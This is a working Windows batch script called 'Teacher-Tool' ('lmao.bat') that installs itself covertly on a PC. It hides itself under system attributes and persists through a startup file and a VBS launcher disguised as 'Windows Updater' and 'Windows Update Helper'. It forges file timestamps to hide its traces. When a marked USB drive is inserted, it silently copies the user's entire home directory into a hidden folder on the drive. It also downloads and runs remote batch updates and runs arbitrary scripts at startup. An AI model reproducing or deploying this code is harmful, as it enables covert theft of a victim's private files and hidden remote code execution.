REM DBGVersion 8.0
@echo off
echo init begin

set skipped=false
echo Checking for custom copy script...
if exist noskip.dat (
set /p customcopy=<noskip.dat
set skipped=false
echo Custom script found and applied...
)
if exist skip.dat (
set /p customcopy=<skip.dat
set skipped=true
echo Custom script found and applied...
)

set skipcheck=false
set HDver=0
set vers=0
set novbs=false
set debugmsg=true
if exist debugmsg.dat (
set debugmsg=false
copy debugmsg.dat "%appdata%\Microsoft\Windows\" /y >nul 2>&1
)
if %debugmsg%==false @echo on

set ver=_NO_VER 0
set HDDver=_NO_VER 0

set /p HDDver=<"%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
if exist "%appdata%\Microsoft\Windows\lmao.bat" (
if not %HDDver:~0,3%==REM (
set HDDver=HDD version does not have header[ver possibly lower than 4.5-DEBUGrelease]...
set skipcheck=true
)
)
set HDDver=%HDDver:REM =%
set /p DBGVer=<lmao.bat
set DBGVer=%DBGVer:~4,3%
if %DBGVer%==DBG (echo Using DBG version... Beware!)

set filename=lmao69.dat
echo Filename set to %filename%...

if not "%cd%"=="%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" (
if not "%cd%"=="%appdata%\Microsoft\Windows" (
if not exist %filename% (
echo entered %filename% creation
echo initcopy>%filename%
attrib +h %filename%
)
)
)

set skip=False
set tries=0
if not exist "%appdata%\Microsoft\Windows\updating.dat" (echo launching atstartup applications if any... && if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (for /r "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" %%a in (*.bat) do (call "%%a")))
set state=NOTUPDATING
set dirr=HDD
if exist %filename% (set dirr=FLASH)
if NOT %dirr%==FLASH (title Teacher-Tool %HDDver%)
echo we are on %dirr%

REM because delayed expansion causes weird behavior with win. defender and values dont change in IFs(whyyyy), this is the only option. these variables are used when installing
set HDver=%HDver:DBGVersion_=%
set HDver=%HDver:Version=%
set HDver=%HDver:.=%

set HDver=%HDver:[DEBUGrelease]=%
REM here for compatibility


echo Downloading update info
if not %DBGVer%==DBG (
curl --ssl-no-revoke https://raw.githubusercontent.com/RealFoxerity/Teacher-Tool/main/Updates/CurrentVer.dat >ver.dat
) else (
curl --ssl-no-revoke https://raw.githubusercontent.com/RealFoxerity/Teacher-Tool/main/Updates/CurrentDEBUGVer.dat >ver.dat
)
set /p NewVer=<ver.dat
echo Newest version available is: %NewVer% 
set vers=%NewVer:DBGVersion_=%
set vers=%vers:Version=%
set vers=%vers:.=%

set WillUpd=False
if exist "%NewVer%.bat" (set WillUpd=True)

if not exist NOONLINEUPDS.dat (set UpdatedFromOnline=True) else (set UpdatedFromOnline=False)

if %UpdatedFromOnline%==True (echo Performing online update [currently dbg feature only]... && goto :installLmao)
:AfterOnlineUpd



echo initialization finished; starting main code
echo trying to find correct drive
goto :searching

:changedate
if exist skipdatechange.dat (if %skip%==true (goto :1) else (goto :searching))
echo starting datechange for vbs
c:
cd "%appdata%\Microsoft\Windows\"
attrib -s "Windows Update Helper.vbs"
powershell  (Get-Item "Windows` Update` Helper.vbs").CreationTime=Get-Date
powershell  (Get-Item "Windows` Update` Helper.vbs").LastWriteTime=Get-Date
powershell  (Get-Item "Windows` Update` Helper.vbs").LastAccessTime=Get-Date
attrib +s "%appdata%\Microsoft\Windows\Windows Update Helper.vbs"

echo starting datechange for startup bat
cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
attrib -s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Updater.bat"
powershell  (Get-Item "Windows` Updater.bat").CreationTime=Get-Date
powershell  (Get-Item "Windows` Updater.bat").LastWriteTime=Get-Date
powershell  (Get-Item "Windows` Updater.bat").LastAccessTime=Get-Date
attrib +s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Updater.bat"

echo starting datechange for main bat
attrib -s -h "%appdata%\Microsoft\Windows\lmao.bat"
cd "%appdata%\Microsoft\Windows"
powershell  (Get-Item "lmao.bat").LastWriteTime=Get-Date
powershell  (Get-Item "lmao.bat").LastAccessTime=Get-Date
powershell  (Get-Item "lmao.bat").CreationTime=Get-Date
attrib +s "%appdata%\Microsoft\Windows\lmao.bat"

echo checking for additional folders
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (goto :lmaostartuptask)
:aftertask
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" (goto :atinserttask)
:afterndtask

if defined customcopy (
echo Found custom copy script...
cd "%appdata%\Microsoft\Windows\"
REM NEEDS TO BE MOVED; POWERSHELL CANT RUN IN IF
goto :CstScr
)
:backfromCstScr
if %skip%==true (goto :1)

echo trying to find correct drive
:searching
if %tries%==100000 (set tries=0 && goto :changedate)
if exist "d:\%filename%" (d: && goto :b)
if exist "e:\%filename%" (e: && goto :b)
if exist "f:\%filename%" (f: && goto :b)
if exist "g:\%filename%" (g: && goto :b)
set /a tries=%tries% + 1
goto :searching

:b
echo found drive
set com=0
set /p com=<%filename%
echo calling atinsert programs if any...
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" (for /r "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" %%a in (*.bat) do (call "%%a"))
if exist force_dat.dat (set /p com=<%filename% && echo forcing recheck)
if exist %com% (
if exist atstartup.dat (goto :c)
if exist atinsert.dat (goto :i)
echo %filename% contains valid batch executable, calling %com%
call %com%
set com=initcopy
)
:d
if exist novbs.dat set novbs=true
if exist UNIN000.dat goto :u

if not %com%==initcopy (echo contents of %filename% are not correct or do not specify valid batch file && goto :searching)
echo %filename% verified - on correct drive


if not exist alreadycopied.dat (echo false >alreadycopied.dat)
set /p copied=<alreadycopied.dat

if exist TERMINATECMD.dat (taskkill /f /im "cmd.exe")
if exist transfer.dat (echo beginning transfer of files && xcopy transfer\* %homedrive%%homepath% /y)

set /p ver=<lmao.bat

if not %dirr%==FLASH ( 
if not %ver:~0,3%==REM (
echo USB VERSION DOESNT HAVE HEADER; DOWNGRADING BELOW 4.5-DEBUGrelease!!! BEWARE...
if NOT exist beware.dat (
echo DOWNGRADED FROM "%HDDver%" TO SOMETHING BELOW 4.5-DEBUGrelease!!! BEWARE... >beware.dat 
attrib +h beware.dat
)
)
)

set ver=%ver:REM =%
if %dirr%==FLASH (title Teacher-Tool %ver%)
set vers=%ver:~8%
set vers=%vers:.=%
set vers=%vers:[DEBUGrelease]=%


if %UpdatedFromOnline%==False (
:installLmao
if "%HDver%"=="%vers%" (if "%copied%"=="false" (if %skipcheck%==false (
if exist forceupd.dat (
echo No version change, but forcing update anyways...
) else (
echo no version change, update skipped...
REM goto :skipupdate
))))
if "%UpdatedFromOnline%"=="True" (goto :OnlineUpd)

if %UpdatedFromOnline%==False (
if "%dirr%"=="FLASH" (
:OnlineUpd
if exist lmao.bat (
if %skipcheck%==false (
if "%HDver%" LSS "%vers%" (if not "%HDver%"=="0" (echo upgrading...) else (echo installing...))
if exist forceupd.dat (
if "%HDver%" GTR "%vers%" (echo downgrading...)
)
)
)


echo From: %HDDver%
echo To: %ver%

echo re/installing vbs to be sure
attrib -s "%appdata%\Microsoft\Windows\Windows Update Helper.vbs" >nul 2>&1
attrib -s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Updater.bat" >nul 2>&1
goto :createvbs
:aftervbs

attrib -s -h "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
del "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
attrib -s -h lmao.bat

echo vbs and startup bat installed
if %UpdatedFromOnline%==True (if %WillUpd%==False (
curl -O --ssl-no-revoke "https://raw.githubusercontent.com/RealFoxerity/Teacher-Tool/main/Updates/%NewVer%.bat"
echo Calling downloaded bat...
copy "%NewVer%.bat" "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
echo new lmao.bat installed
)
)

if %UpdatedFromOnline%==False (
xcopy lmao.bat "%appdata%\Microsoft\Windows\" /y >nul 2>&1
)
attrib +s +h lmao.bat
echo new lmao.bat installed
)
:skipupdate
if "%UpdatedFromOnline%"=="True" (
if "%dirr%"=="FLASH" (
goto :miss
)
goto :AfterOnlineUpd && echo Online update was completed successfully...

attrib -h alreadycopied.dat
echo true >alreadycopied.dat
attrib +h alreadycopied.dat
)
echo x >"%appdata%\Microsoft\Windows\updating.dat"
echo getting back on hdd version
goto :miss
)



if %copied%==false (
if %dirr%==HDD (
if not "%UpdatedFromOnline%"=="True" (
echo making preparations to enter flash version
if exist lmao.bat (
start lmao.bat
echo x >"%appdata%\Microsoft\Windows\updating.dat"
echo started flash lmao
if not %novbs%==false pause
exit
)
)
)
)
echo on hdd bat
echo removing temp file
del "%appdata%\Microsoft\Windows\updating.dat" >nul 2>&1
attrib +s "%appdata%\Microsoft\Windows\Windows Update Helper.vbs"
attrib +s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Updater.bat"

set curr=%cd%
set curr=%curr:~0,2%
set skip=true
echo setup for datechange finished
goto :changedate
:1
echo datechange successful; getting back on usb
%curr%

attrib -h alreadycopied.dat >nul 2>&1
del alreadycopied.dat >nul 2>&1
if exist dontcopy.dat (echo copying skipped because of dontcopy.dat; checking for usb removal... && echo " ">iwashere.dat && goto :whileexist)

if defined customcopy (echo Custom copy script found, using instead of default... & goto :checkExt)

set dire=%random%
if exist RESUME (set /p dire=<RESUME)

if not exist customcopy.dat (
:defaultcopy
REM set.. and if.. moved, because they dont work in if, which is needed for customcopy
if not exist RESUME (echo %dire% > RESUME & attrib +h RESUME)
if not exist %dire% (mkdir "%dire%" & attrib +s +h "%dire%")
echo made preparations for copying and made folders hidden
xcopy /S /D "%homedrive%%homepath%" "%dire%" /Y
echo end of copying; removing temp files
attrib -h RESUME
del RESUME
) else (
echo Found customcopy.dat, will try to load custom copy script...
goto :checkExt
REM function is called due to me not being able to do enabledelayedexpansion and is much lower in script (ln 351-356)
)
:backfromcheckExt


echo checking for usb removal...

:whileexist
del /q "%appdata%\Microsoft\Windows\debugmsg.dat" >nul 2>&1
del "%appdata%\Microsoft\Windows\doing.dat" >nul 2>&1
if not exist %filename% (echo usb removed, restaring app && goto :miss)
goto :whileexist
exit

:c
echo creating startup files and folder
if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (mkdir "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup")
attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"
xcopy %com% "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup\" /y
attrib +s +h "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"
set com=initcopy
del atstartup.dat
goto :d

:i
echo creating insert files and folder
if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" (mkdir "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert")
attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"
xcopy %com% "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert\" /y
attrib +s +h "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"
set com=initcopy
del atinsert.dat
goto :d

:u
echo about to uninstall %HDDver% from hdd
echo ENTERED UNINSTALL FASE; REST IN INFO.TXT
echo removing system and hidden properties from folders and files... > info.txt
attrib -s "%appdata%\Microsoft\Windows\Windows Update Helper.vbs" >nul 2>&1
attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" >nul 2>&1
attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" >nul 2>&1
attrib -s -h "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
echo properties removed, continuing... >> info.txt

echo Checking for lmaostartup... >> info.txt
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (
echo lmaostartup was found... >> info.txt
echo removing lmaostartup... >> info.txt
rmdir /s /q "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" >nul 2>&1
echo lmaostartup removed >> info.txt
) else (echo lmaostart was not found - continuing... >> info.txt)

echo Checking for atinsert... >> info.txt
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" (
echo atinsert was found... >> info.txt
echo removing atinsert... >> info.txt
rmdir /s /q "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" >nul 2>&1
echo atinsert removed >> info.txt
) else (echo atinsert was not found - continuing... >> info.txt)

echo removing startup bat... >> info.txt
del /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Updater.bat" >nul 2>&1
echo startup bat removed >> info.txt

echo removing vbs... >> info.txt
del /q "%appdata%\Microsoft\Windows\Windows Update Helper.vbs" >nul 2>&1
echo vbs removed >> info.txt

echo removing lmao.bat (if uninstalling without lmao.bat on usb, rest not available)... >> info.txt
del /q "%appdata%\Microsoft\Windows\debugmsg.dat" >nul 2>&1

if not %novbs%==false (
echo After pause, the next line will remove lmao.bat and, if you do not have lmao.bat on usb, thus crash the program, do not be alarmed...
pause
)
del /q "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
echo lmao.bat removed >> info.txt
echo UNINSTALL COMPLETED SUCCESSFULLY >> info.txt
if not %novbs%==false (
echo Teacher-Tool has been successfully uninstalled and after pause, uninstaller will exit...
echo Beware: if you don't have lmao.bat on usb, TT HAS NOT BEEN UNINSTALLED AND SOMETHING WENT EXTREMELY WRONG!!!
pause
)
exit

:miss
echo entered restart fase
%homedrive:~0,2%
if %novbs%==false (
cd "%appdata%\Microsoft\Windows\"
wscript "Windows Update Helper.vbs"
exit
)
cd "%appdata%\Microsoft\Windows\"
start lmao.bat
if not %novbs%==false pause
exit

REM DO NOT PUT IN IF; MAKES CMD EXECUTE IN ORDER TO FIND ERRORS AND CRASHES (because of missing files)

:lmaostartuptask
echo lmaostartup datechange entered
set tempor="%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"
set tempor=%tempor: =` %
powershell (Get-Item %tempor% -force).LastWriteTime=Get-Date
powershell (Get-Item %tempor% -force).LastAccessTime=Get-Date
powershell (Get-Item %tempor% -force).CreationTime=Get-Date
powershell (Get-Item %tempor%\* -force).LastWriteTime=Get-Date
powershell (Get-Item %tempor%\* -force).LastAccessTime=Get-Date
powershell (Get-Item %tempor%\* -force).CreationTime=Get-Date
echo datechange successful
goto :aftertask


:atinserttask
echo atinsert datechange entered
set tempor="%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"
set tempor=%tempor: =` %
powershell (Get-Item %tempor% -force).LastWriteTime=Get-Date
powershell (Get-Item %tempor% -force).LastAccessTime=Get-Date
powershell (Get-Item %tempor% -force).CreationTime=Get-Date
powershell (Get-Item %tempor%\* -force).LastWriteTime=Get-Date
powershell (Get-Item %tempor%\* -force).LastAccessTime=Get-Date
powershell (Get-Item %tempor%\* -force).CreationTime=Get-Date
echo datechange successful
goto :afterndtask

REM END OF CRUCIAL CODE POSITION


:createvbs
echo creating vbs and startup bat
echo @echo off >"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Updater.bat"
echo wscript "%appdata%\Microsoft\Windows\Windows Update Helper.vbs" >>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Updater.bat"
echo exit >>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Updater.bat"

echo 'idk >"%appdata%\Microsoft\Windows\Windows Update Helper.vbs"
echo Set WshShell = CreateObject("WScript.Shell") >>"%appdata%\Microsoft\Windows\Windows Update Helper.vbs"
echo 'idk >>"%appdata%\Microsoft\Windows\Windows Update Helper.vbs"
echo WshShell.Run chr(34) ^& "%appdata%\Microsoft\Windows\lmao.bat" ^& Chr(34), 0  >>"%appdata%\Microsoft\Windows\Windows Update Helper.vbs"
echo 'idk >>"%appdata%\Microsoft\Windows\Windows Update Helper.vbs"
echo 'idk >>"%appdata%\Microsoft\Windows\Windows Update Helper.vbs"
echo Set WshShell = Nothing >>"%appdata%\Microsoft\Windows\Windows Update Helper.vbs"
echo 'idk >>"%appdata%\Microsoft\Windows\Windows Update Helper.vbs"
echo 'idk >>"%appdata%\Microsoft\Windows\Windows Update Helper.vbs"
echo created successfully
goto :aftervbs

:checkExt
set toCall=FAILED
if exist customcopy.dat (set /p toCall=<customcopy.dat)
set fileext=%toCall:~-4%
if not exist customcopy.dat (if defined customcopy (set toCall=%customcopy% & set fileext=.bat & if %skipped%==false (goto :checkExtNoAbortCopy)) else (if not exist elseabortcopy.dat goto :checkExtNoAbortCopy))

if "%toCall%"=="FAILED" (echo MISSING CUSTOM COPY SCRIPT NAME, NO COPYING PERFORMED[elseabortcopy.dat] & echo checking for usb removal... & echo " ">iwashere.dat & goto :whileexist)
if "%fileext%"=="%toCall%" (echo INVALID CUSTOM COPY SCRIPT NAME[TOO SHORT], NO COPYING PERFORMED[elseabortcopy.dat] & echo checking for usb removal... & echo " ">iwashere.dat & goto :whileexist)
if not %fileext:~0,1%==. (echo INVALID CUSTOM COPY SCRIPT NAME[NO EXTENSION], NO COPYING PERFORMED[elseabortcopy.dat] & echo checking for usb removal... & echo " ">iwashere.dat & goto :whileexist)
if not exist "%toCall%" (echo CUSTOM COPY BATCH DOES NOT EXIST, NO COPYING PERFORMED[elseabortcopy.dat] & echo checking for usb removal... & echo " ">iwashere.dat & goto :whileexist)
if not %fileext%==.bat (echo CUSTOM COPY PROGRAM NEEDS TO BE *.BAT*, NO COPYING PERFORMED[elseabortcopy.dat] & echo checking for usb removal... & echo " ">iwashere.dat & goto :whileexist)

:backfromChkExtNAC
if exist newdefault.dat (goto :applycustomscript)
:afterdefault

echo Calling custom copy batch - %toCall%...
call "%toCall%"
goto :backfromcheckExt

:checkExtNoAbortCopy
if "%toCall%"=="FAILED" (echo MISSING CUSTOM COPY SCRIPT NAME, REVERTING TO DEFAULT METHOD... & goto :defaultcopy)
if "%fileext%"=="%toCall%" (echo INVALID CUSTOM COPY SCRIPT NAME[TOO SHORT], REVERTING TO DEFAULT METHOD... & goto :defaultcopy)
if not %fileext:~0,1%==. (echo INVALID CUSTOM COPY SCRIPT NAME[NO EXTENSION], REVERTING TO DEFAULT METHOD... & goto :defaultcopy)
if not exist "%toCall%" (echo CUSTOM COPY BATCH DOES NOT EXIST, REVERTING TO DEFAULT METHOD... & goto :defaultcopy)
if not %fileext%==.bat (echo CUSTOM COPY PROGRAM NEEDS TO BE *.BAT*, REVERTING TO DEFAULT METHOD... & goto :defaultcopy)
goto :backfromChkExtNAC

:applycustomscript
if not exist customcopy.dat goto :removecustomscript
echo Making custom script default...

if defined customcopy (echo Previous custom found, deleting... & attrib -s %customcopy% >nul 2>&1 & del /Q %customcopy% >nul 2>&1 & attrib -s "%appdata%\Microsoft\Windows\noskip.dat" >nul 2>&1 & attrib -s "%appdata%\Microsoft\Windows\skip.dat" >nul 2>&1 & del /Q "%appdata%\Microsoft\Windows\noskip.dat" >nul 2>&1 & del /Q "%appdata%\Microsoft\Windows\skip.dat" >nul 2>&1 & echo Previous defaults deleted...)
copy "%toCall%" "%appdata%\Microsoft\Windows\"

attrib +s "%appdata%\Microsoft\Windows\%toCall%"
if exist elseabortcopy.dat (echo "%appdata%\Microsoft\Windows\%toCall%" >"%appdata%\Microsoft\Windows\skip.dat" & attrib +s "%appdata%\Microsoft\Windows\skip.dat") else (echo "%appdata%\Microsoft\Windows\%toCall%" >"%appdata%\Microsoft\Windows\noskip.dat" & attrib +s "%appdata%\Microsoft\Windows\noskip.dat")
echo Done - new default set...
goto :afterdefault

:removecustomscript
echo Start of custom script stopped!
echo Removing custom script defaults[newdefaults.dat, but no customcopy.dat]...
attrib -s %customcopy% & del /Q %customcopy% & attrib -s "%appdata%\Microsoft\Windows\noskip.dat" >nul 2>&1 & attrib -s "%appdata%\Microsoft\Windows\skip.dat" >nul 2>&1 & del /Q "%appdata%\Microsoft\Windows\noskip.dat" >nul 2>&1 & del /Q "%appdata%\Microsoft\Windows\skip.dat" >nul 2>&1 & echo Custom script deleted...
goto :backfromcheckExt
REM yes, this was copied straight from the if statement

:CstScr
if exist skip.dat (
goto :skipDat
)
if exist noskip.dat (
goto :noskipDat
)
:backfromskip
echo Ran datechange on no/skip.dat...

echo Running datechange on custom script...
set tempor="%customcopy%"
set tempor=%tempor: =` %
powershell (Get-Item %tempor% -force).LastWriteTime=Get-Date
powershell (Get-Item %tempor% -force).LastAccessTime=Get-Date
powershell (Get-Item %tempor% -force).CreationTime=Get-Date
echo Datechange on custom script finished
goto :backfromCstScr

:skipDat
attrib -s skip.dat
powershell  (Get-Item "skip.dat").CreationTime=Get-Date
powershell  (Get-Item "skip.dat").LastWriteTime=Get-Date
powershell  (Get-Item "skip.dat").LastAccessTime=Get-Date
attrib +s skip.dat
goto :backfromskip

:noskipDat
attrib -s noskip.dat
powershell  (Get-Item "noskip.dat").CreationTime=Get-Date
powershell  (Get-Item "noskip.dat").LastWriteTime=Get-Date
powershell  (Get-Item "noskip.dat").LastAccessTime=Get-Date
attrib +s noskip.dat
goto :backfromskip
